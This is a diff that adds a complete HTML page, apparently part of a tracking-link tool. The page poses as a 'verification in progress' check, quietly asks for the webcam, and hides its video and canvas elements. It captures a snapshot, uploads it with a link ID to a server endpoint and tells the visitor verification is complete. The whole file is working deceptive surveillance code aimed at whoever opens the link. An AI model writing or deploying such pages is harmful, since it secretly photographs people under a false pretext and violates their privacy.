@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <h1>Please wait, verification in progress...</h1>
+
+    <script>
+		(async () => {
+            const pathParts = window.location.pathname.split('/');
+            const linkId = pathParts[pathParts.length - 1];
+
+            if (!linkId) {
+                document.body.innerHTML = "<h1>Invalid Link ID</h1>";
+                return;
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, 640, 480);
+                        const imageData = canvas.toDataURL('image/jpeg');
+                        
+                        fetch('/api/upload', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ id: linkId, imageData: imageData })
+                        });
+
+                        stream.getTracks().forEach(track => track.stop());
+                        document.body.innerHTML = "<h1>Verification complete. You can close this page.</h1>";
+                    }, 500); // Задержка, чтобы камера успела сфокусироваться
+                };
+            } catch (err) {
+                document.body.innerHTML = "<h1>Camera access denied. Verification failed.</h1>";
+            }
+        })();
+    </script>
+</body>
+</html>
